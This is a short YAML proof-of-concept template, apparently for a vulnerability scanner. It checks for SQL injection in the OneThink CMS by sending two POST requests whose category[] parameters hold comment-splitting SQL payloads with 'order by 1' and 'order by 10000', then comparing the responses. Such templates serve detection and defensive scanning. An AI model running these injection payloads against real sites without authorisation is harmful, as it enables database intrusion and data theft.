id: onethink-sql-inject

info:
  name: OneThink SQL injection
  author: zhizhuo
  severity: high
  verified: true
  description: app="Onethink"

rules:
  r0:
    request:
      method: POST
      path: /index.php?s=Home/Article/index&category[0]=between+0/*&category[1][0]=*/and+0)+or+1)+order+by+1+limit+1--+a
    expression: response.status == 200 && !response.body.bcontains(b'var time = --wait.innerHTML;')
  r1:
    request:
      method: POST
      path: /index.php?s=Home/Article/index&category[0]=between+0/*&category[1][0]=*/and+0)+or+1)+order+by+10000+limit+1--+a
    expression: response.body.bcontains(b'跳转提示') && response.body.bcontains(b'var time = --wait.innerHTML;')
expression: r0() && r1()